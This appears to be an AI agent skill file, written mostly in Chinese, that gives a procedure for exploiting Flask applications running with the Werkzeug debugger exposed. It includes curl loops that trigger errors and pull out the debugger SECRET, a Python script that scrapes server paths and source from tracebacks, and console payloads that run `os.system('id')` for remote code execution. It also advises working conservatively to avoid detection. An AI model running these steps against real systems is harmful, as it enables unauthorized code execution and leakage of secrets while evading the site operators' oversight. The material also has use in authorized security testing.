---
name: flask-werkzeug-attack
description: 利用 Flask/Werkzeug 调试器暴露，获取调用栈回溯与 SECRET 泄露。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [flask, werkzeug, debugger, SECRET, recon, python]
  category: recon
---

# Flask/Werkzeug 调试器利用

启用 `debug=True` 的 Flask 应用会开启 Werkzeug 调试器，它会暴露调用栈回溯，并（可选地）提供交互式 Python 控制台。调试器与 Flask 应用运行在同一端口，并在任何未处理异常（HTTP 500）时激活。

## When to Use

- 端口扫描在非标准端口（8080、8081、8084、5000、8000 等）上发现未知 HTTP 服务
- 某个 API 端点返回 HTTP 500，并带有 Flask/Werkzeug 错误页面
- URL 资源（CSS、JS、PNG）中出现 `?__debugger__=yes` 参数
- 错误页面的 HTML 中包含 `var CONSOLE_MODE`、`var EVALEX` 或 `SECRET=`

## Prerequisites

- 具备 curl 的 `terminal`
- 生产环境中启用了 `debug=True` 的 Flask API 服务器（配置错误）
- 可触发 HTTP 500（未处理异常）的端点

## How to Run

```bash
# Check if Werkzeug debugger is active — trigger an error
export TARGET=target.com
export PORT=5000   # set to the observed Werkzeug port

curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/sitemap.xml" 2>/dev/null | grep -oE "(Werkzeug|Debugger|SECRET|CONSOLE_MODE|EVALEX)" | head -5

# Try to trigger error on common paths
for path in "/error" "/500" "/test" "/debug" "/sitemap.xml" "/env" "/config"; do
  result=$(curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}$path" 2>/dev/null)
  if echo "$result" | grep -q "Traceback\|Error\|Werkzeug"; then
    echo "TRIGGERED: $path"
    echo "$result" | grep -oE '(File|Error|SECRET|CONSOLE_MODE|EVALEX)[^<]*' | head -5
  fi
done
```

## Procedure

以下各阶段即为操作流程。对每个探测保持时间限制（`--max-time`），在 `OUTPUT_DIR` 下记录证据，并在 Pitfalls 中列出的停止条件处停止。

## 快速检测

```bash
# Check if Werkzeug debugger is active — trigger an error
export TARGET=target.com
export PORT=5000   # set to the observed Werkzeug port

curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/sitemap.xml" 2>/dev/null | grep -oE "(Werkzeug|Debugger|SECRET|CONSOLE_MODE|EVALEX)" | head -5

# Try to trigger error on common paths
for path in "/error" "/500" "/test" "/debug" "/sitemap.xml" "/env" "/config"; do
  result=$(curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}$path" 2>/dev/null)
  if echo "$result" | grep -q "Traceback\|Error\|Werkzeug"; then
    echo "TRIGGERED: $path"
    echo "$result" | grep -oE '(File|Error|SECRET|CONSOLE_MODE|EVALEX)[^<]*' | head -5
  fi
done
```

## 阶段 1 — 信息泄露

Werkzeug 调试器会暴露：

### 1a — 服务器路径（来自调用栈回溯）
```
File "/var/www/html/target-app-backend/venv/lib/python3.10/site-packages/flask/app.py"
File "/var/www/html/target-app-backend/venv/lib/python3.10/site-packages/flask_cors/extension.py"
File "/var/www/html/target-app-backend/venv/lib/python3.10/site-packages/..."
```

### 1b — 调试器 SECRET（来自 HTML）
```html
<script>
  var CONSOLE_MODE = false,
      EVALEX = false,
      EVALEX_TRUSTED = false,
      SECRET="vYQ93K...8cww";
</script>
```

### 1c — 框架与语言版本
- Flask 框架（Python 3.x）
- flask_cors 扩展状态
- 带行号的完整调用栈
- 源代码上下文（每个栈帧前后 5 行）

### 1d — 完整代码上下文提取

```python
import os, requests, re

HOST = os.environ.get("TARGET", "target.com")
PORT = os.environ.get("PORT", "5000")
resp = requests.get(f"https://{HOST}:{PORT}/ERROR_PATH", verify=False)
traceback = resp.text

# Extract all filenames from traceback frames
files = re.findall(r'File\s+\"([^\"]+)\"', traceback)
for f in files:
    print(f"  {f}")

# Extract source code snippets
sources = re.findall(r'<pre[^>]*class="source[^"]*"[^>]*>(.*?)</pre>', traceback, re.DOTALL)
for s in sources:
    clean = re.sub(r'<[^>]+>', '', s)
    print(clean[:200])
```

## 阶段 2 — 调试器控制台访问（RCE）

Werkzeug 调试器控制台允许在服务器上执行 Python 代码，前提是 `EVALEX=true` 且 `CONSOLE_MODE=true`。

### 2a — 检查控制台状态

```bash
# The SECRET and console mode are in the HTML
curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/sitemap.xml" | grep -oE '(CONSOLE_MODE|EVALEX|EVALEX_TRUSTED|SECRET)="?[^"&;]+'
```

### 2b — 控制台访问（若已启用）

如果 `EVALEX=true`：

```bash
# Access the console
curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/console"
```

**信号判定：** 如果 `/console` 返回 HTTP 400（而非 404），说明调试器确实处于激活状态，但控制台已被禁用。HTTP 404 表示根本没有调试器。HTTP 200 且返回控制台界面表示可执行 RCE。

如果 `EVALEX=true`：

```bash
# Execute Python commands (POST to the debugger endpoint)
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://${TARGET}:${PORT}/sitemap.xml?__debugger__=yes&cmd=e&s=SECRET" \
  -d "code=__import__('os').system('id')"

# Alternative: GET-based eval
curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/sitemap.xml?__debugger__=yes&cmd=eval&code=__import__('os').system('id')&s=SECRET"
```

**注意：** 控制台端点可能要求特定方法（POST 或 GET），使用错误的方法可能返回 HTTP 405。两种方法都要测试。

### 2c — 控制台被禁用时的处理

如果 `EVALEX=false`（生产环境中最常见），控制台处于**禁用**状态，无法执行命令。不过：

1. **SECRET 仍然有价值** —— 它证明动态调试器处于激活状态
2. **调用栈回溯仍会泄露** —— 完整的服务器路径、框架版本、源代码上下文
3. **留意 `?__debugger__=yes`** —— 这就是调试器接口本身；如果它能加载，说明调试器部分处于激活状态
4. **检查错误页面中的源代码** —— 某些端点可能无需控制台即可返回完整的源码上下文

## 阶段 3 — 目录/路径探测

除特定的错误触发路径之外，继续探测其他可能泄露不同信息的端点：

```bash
# Path traversal in error generation
curl --max-time 30 --connect-timeout 10 -sk "https://${TARGET}:${PORT}/path/to/../sitemap.xml"

# Test various HTTP methods
curl --max-time 30 --connect-timeout 10 -sk -X OPTIONS "https://${TARGET}:${PORT}/sitemap.xml"
curl --max-time 30 --connect-timeout 10 -sk -X PUT "https://${TARGET}:${PORT}/sitemap.xml"
curl --max-time 30 --connect-timeout 10 -sk -X DELETE "https://${TARGET}:${PORT}/sitemap.xml"

# Check if error page returns CORS headers
curl --max-time 30 --connect-timeout 10 -sk -D- "https://${TARGET}:${PORT}/sitemap.xml" | grep -i access-control
```

## Pitfalls

- **EVALEX=false 意味着无法通过控制台实现 RCE。** 当控制台模式被禁用时，不要浪费时间尝试执行代码。
- **仅有 SECRET 还不够。** 即使 SECRET 正确，也必须启用控制台才能执行代码。
- **并非所有 HTTP 500 页面都是 Werkzeug。** 没有 HTML 格式的普通 Flask 错误页面，或仅返回 JSON 的响应，都不是 Werkzeug 调试器。调试器具有独特的蓝色主题 HTML 页面，包含可折叠的栈帧和源代码上下文。
- **调试器可能位于 CORS 之后。** 检查 `Access-Control-Allow-Origin` 头部 —— 调试器页面上的 CORS 通配符意味着攻击者控制的网站可以通过 fetch() 读取 SECRET 和调用栈回溯。
- **触发错误会留下日志。** 每次请求调试器页面都会在服务器日志中产生一条 500 错误。要保守操作以避免被检测。

## Verification
- 认定漏洞需要 Werkzeug 的调用栈回溯 HTML（可折叠栈帧、调试器资源），而不是任意 HTTP 500。
- `/console` 返回 400 证明调试器处于激活状态但控制台被禁用；只有返回命令输出的控制台 POST 请求才能证明 RCE。
- 完整栈帧以及任何泄露的 `SECRET` 都记录在 `${OUTPUT_DIR:-./output}` 下。

---

## 相关技能

- **`hunt-rce`** —— 通用 RCE 挖掘；启用控制台的 Werkzeug 即构成 RCE
- **`hunt-frameworks`** —— Python 框架漏洞挖掘（Django、FastAPI）
- **`js-secrets-extraction`** —— 寻找可能适用于该 Flask API 的 API 密钥
- **`source-leak-hunt`** —— 寻找可能包含 Flask SECRET_KEY 的 .env 和配置文件
- **`hunt-cache-poison`** —— 通过 Werkzeug 错误页面实施缓存投毒（若 CDN 缓存了该 500 响应）
